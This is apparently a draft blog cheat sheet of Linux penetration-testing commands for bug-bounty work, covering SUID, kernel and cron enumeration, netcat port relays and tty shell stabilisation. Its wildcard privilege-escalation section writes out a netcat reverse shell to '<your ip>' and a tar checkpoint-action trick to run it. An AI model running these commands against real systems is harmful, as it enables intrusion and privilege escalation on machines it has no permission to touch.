---
title: "SRC tips"
categories:
  - 技术
  - 教程
tags: [SRC, tips]
draft: true
sidebar: false
outline: deep
---

# SRC tips

## Useful Linux command

---

### SUID 提权枚举 (Suid)

```bash
find / -user root -perm /4000 2>/dev/null
```

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
find / -type f -name '*.txt' 2>/dev/null
```

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/suid
```

```bash
getcap -r / 2>/dev/null
```

---

### 系统发行版信息 (VersionSystem)

```bash
cat /etc/issue
```

```bash
cat /etc/*-release
```

```bash
cat /etc/lsb-release
```

```bash
cat /etc/redhat-release
```

---

### 内核版本信息 (KernelVersion)

```bash
cat /proc/version
```

```bash
uname -a
```

```bash
uname -mrs
```

```bash
rpm -q kernel
```

```bash
dmesg | grep Linux
```

```bash
ls /boot | grep vmlinuz
```

---

### 环境变量 (EnvironmentVariables)

```bash
cat /etc/profile
```

```bash
cat /etc/bashrc
```

```bash
cat ~/.bash_profile
```

```bash
cat ~/.bashrc
```

```bash
cat ~/.bash_logout
```

```bash
env
```

```bash
set
```

---

### 服务配置文件 (ServiceSettings)

```bash
cat /etc/syslog.conf
```

```bash
cat /etc/chttp.conf
```

```bash
cat /etc/lighttpd.conf
```

```bash
cat /etc/cups/cupsd.conf
```

```bash
cat /etc/inetd.conf
```

```bash
cat /etc/apache2/apache2.conf
```

```bash
cat /etc/my.conf
```

```bash
cat /etc/httpd/conf/httpd.conf
```

```bash
cat /opt/lampp/etc/httpd.conf
```

```bash
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
```

---

### 定时任务 (Cron Jobs)

```bash
crontab -l
```

```bash
ls -alh /var/spool/cron
```

```bash
ls -al /etc/ | grep cron
```

```bash
ls -al /etc/cron*
```

```bash
cat /etc/cron*
```

```bash
cat /etc/at.allow
```

```bash
cat /etc/at.deny
```

```bash
cat /etc/cron.allow
```

```bash
cat /etc/cron.deny
```

```bash
cat /etc/crontab
```

```bash
cat /etc/anacrontab
```

```bash
cat /var/spool/cron/crontabs/root
```

---

### 网络与主机状态 (UsersHost)

```bash
lsof -i
```

```bash
lsof -i :80
```

```bash
grep 80 /etc/services
```

```bash
netstat -antup
```

```bash
netstat -antpx
```

```bash
netstat -tulpn
```

```bash
chkconfig --list
```

```bash
chkconfig --list | grep 3:on
```

```bash
last
```

```bash
lastlog
```

---

### 端口转发与隧道 (PortForwarding)

```bash
FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
```

```bash
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
```

```bash
ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
```

```bash
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
```

```bash
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
```

```bash
mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
```

```bash
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay
```

```bash
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)
```

```bash
backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc
```

```bash
localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)
```

---

### 通配符提权 (Wildcard Privesc)

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh
```

```bash
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
```

```bash
touch "/var/www/html/--checkpoint=1"
```

---

## TTY Spawn Shell

Often during pentests you may obtain a shell without having tty, yet wish to interact further with the system. Here are some commands which will allow you to spawn a tty shell. Obviously some of this will depend on the system environment and installed packages.

<span style="font-size: 23px;">**All the steps to stabilize your shell**</span>

**The first step:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys.

**Step two is:**

```bash
export TERM=xterm
```
This will give us access to term commands such as clear.

**Finally (and most importantly) we will background the shell using**

```bash
Ctrl + Z
```
Back in our own terminal we use

```bash
stty raw -echo; fg
```

This does two things: first, it turns off our own terminal echo which gives us access to `tab` autocompletes, the arrow keys, and `Ctrl + C` to kill processes


## Script to check every misconfigurations

::: details misconfiguration.sh
<<< ../files/script/misconfiguration.sh

:::

---